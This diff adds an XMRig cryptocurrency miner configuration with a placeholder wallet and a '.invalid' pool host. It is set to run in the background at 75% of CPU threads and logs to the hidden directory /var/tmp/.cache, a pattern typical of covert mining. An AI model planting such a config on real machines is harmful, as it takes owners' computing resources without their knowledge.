@@ -1,0 +1,17 @@
+{
+  "autosave": true,
+  "cpu": { "enabled": true, "huge-pages": true, "max-threads-hint": 75 },
+  "donate-level": 1,
+  "pools": [
+    {
+      "url": "stratum+tcp://pool.minexmr.invalid:4444",
+      "user": "WALLET_PLACEHOLDER.worker01",
+      "pass": "x",
+      "algo": "cryptonight/r",
+      "keepalive": true,
+      "tls": false
+    }
+  ],
+  "log-file": "/var/tmp/.cache/xmrig.log",
+  "background": true
+}
